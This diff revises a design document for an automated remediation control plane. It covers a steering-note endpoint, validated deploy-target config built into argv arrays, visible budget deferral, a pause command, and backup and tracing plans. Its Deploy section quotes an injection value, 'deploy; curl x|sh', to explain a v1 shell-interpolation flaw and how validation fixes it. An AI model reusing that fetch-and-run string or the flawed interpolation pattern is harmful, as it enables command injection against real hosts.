@@ -86,8 +86,9 @@ see *Self-concealing change* below.
 2. **Deterministic control plane; LLMs only inside bounded steps.** No LLM call
    decides a state transition.
 3. **Every surface is optional; the ledger and the loop are not.**
-4. **Policy names a key, code owns the entire argv.** No exceptions — see
-   *Deploy*, where v1 broke this and had to be reverted.
+4. **A policy file may name and parameterise, never express.** Config carries
+   validated values; code owns the argv array. v1 broke this by interpolating
+   config into a shell string — see *Deploy*, which is where the line actually is.
 5. **Observation status and remediation obligation are different facts.** A
    signal going quiet may cancel the need to *start* work. It may never discharge
    a verdict, a pending approval, or an in-flight operation.
@@ -340,6 +341,13 @@ That distinction is exactly what a bearer-authenticated `/decide` erased.
 |-|-|-|
 | `GET` | `/board` `/items/:id` `/health` `/metrics` | projections; opened `file:…?mode=ro` |
 | `POST` | `/items/:id/intent` | records an intent; never signs, never executes |
+| `POST` | `/items/:id/note` | free-text steering, appended to the next brief |
+
+**Steering is not approving.** Approving answers a yes/no warden asked; steering
+is *"don't fix the threshold, fix the probe"* — an additional constraint on the
+next episode's brief. Warden has no primitive for it today. A note carries no
+authority, so it needs no signature — which is exactly why it must never be able
+to advance a state.
 
 Argo caches `GET` responses in Postgres purely so the page renders when the mini
 is unreachable, stamped with fetch time. An HTTP cache, not a mirror.
@@ -351,10 +359,25 @@ v1 proposed a machine-writable `deploy-targets.json` interpolated into
 inexpressible. **That string is a shell.** `"deploy; curl x|sh"` is a second
 command; `env` was unquoted. It broke principle 4 on the same page that states it.
 
-Keep the closed `case`: the JSON names a **key**, code owns the whole argv. This
-is the shape already used three times (`VERB_ALLOWLIST`, `EVIDENCE_ALLOWLIST`,
-`LIVENESS_ALLOWLIST`) plus `deploy_argv` — four instances of one principle. Adding
-a repo is a two-line diff, which is acceptable friction for the property.
+The reviewer's fix was to keep the closed `case`. **Overridden**, with a reason:
+the defect was the *shell string*, not the data. Killing the string keeps the
+property and removes the friction.
+
+```
+validate  host   in a known-hosts set        dir     ^[A-Za-z0-9._/~-]+$
+          target ^[A-Za-z0-9_-]+$            env     ^[A-Z_]+=[A-Za-z0-9_.-]+$
+build     an argv array, never an f-string
+test      a field containing ; $ ` ' " or whitespace is REJECTED, asserted
+```
+
+`ssh` joins its remote command into a string no matter what, so validation — not
+quoting — is what makes this safe. With every field constrained to a charset that
+cannot express a metacharacter, the concatenation is safe by construction, and
+adding a repo is one line of config with no code diff.
+
+`VERB_ALLOWLIST`, `EVIDENCE_ALLOWLIST` and `LIVENESS_ALLOWLIST` keep the closed
+`case` shape unchanged — they name behaviours, not arguments, so there is nothing
+to validate and no friction to remove.
 
 Even with perfect quoting, a Make target executes repo code, so *who may modify
 the target* matters more than *who may name it* — hence the `Makefile`/`scripts/**`
@@ -378,6 +401,16 @@ cap, forty correlated alerts are forty merges and forty deploys.
 Add: **a per-repo in-flight lock.** Two implement episodes on one repo today cut
 two branches from the same base and open two unaware draft PRs — reachable now,
 more so as origins multiply.
+
+**Deferral must be visible.** Today a budget hit writes
+`triage: at MAX_OPEN_INVESTIGATIONS=3, deferring cluster in research-gateway` to a
+`.err` file nobody reads. An invisible budget is indistinguishable from a broken
+loop, and it is the one way budgets become real friction. `deferred` is a
+first-class board state carrying which ceiling held it and what releases it.
+
+**`warden pause`** — one command or one button, stops all escalation while leaving
+ingest running. During a real outage the ledger should keep recording and the
+robot should hold still.
 
 ### Abort and revert — neither exists today
 
@@ -425,9 +458,9 @@ write path, caused by a dashboard read.
   queue.
 - **One migrator** plus a `schema_version` table; migrations run only by the loop
   at boot; the API refuses to start on mismatch.
-- **Backup.** `VACUUM INTO` on every heartbeat, rotated, one copy off the mini.
-  There is no restore path today, on a machine with FileVault off, auto-login on
-  and unattended reboots.
+- **Backup.** `VACUUM INTO` on every heartbeat, rotated, shipped to homelab's
+  existing restic → B2 path (see *Observability*). There is no restore path today,
+  on a machine with FileVault off, auto-login on and unattended reboots.
 - After extraction, the Slack approval plugin must stop writing this file
   directly, or the "control plane inside the thing it supervises" coupling
   silently returns.
@@ -444,6 +477,17 @@ write path, caused by a dashboard read.
   $82 / 14 days; the agentic path runs on the flat Max subscription. **Cost is not
   a constraint on this design** — route for quality.
 - **Uptime Kuma push**, joining the existing composite heartbeat.
+- **One trace per item, one span per stage**, emitted to HyperDX. It already
+  ingests OTel and `/otel` already queries it, so this is a client, not a stack.
+  The number that matters is **duration split by stage**: a median time-to-fix is
+  useless if it hides that 90% of it was waiting on a human — which is the number
+  this design exists to move.
+- **Episode transcripts linked from the item.** "What did the agent actually do"
+  must not require finding a worktree by UUID.
+- **Backup** rides the existing homelab restic → B2 path rather than inventing
+  one: the `VACUUM INTO` snapshot ships mini → homelab over the tailnet into a
+  directory restic already covers. Open: restic runs *on* homelab and the mini is
+  not currently in its source set — verify the paths before assuming coverage.
 
 ---
 
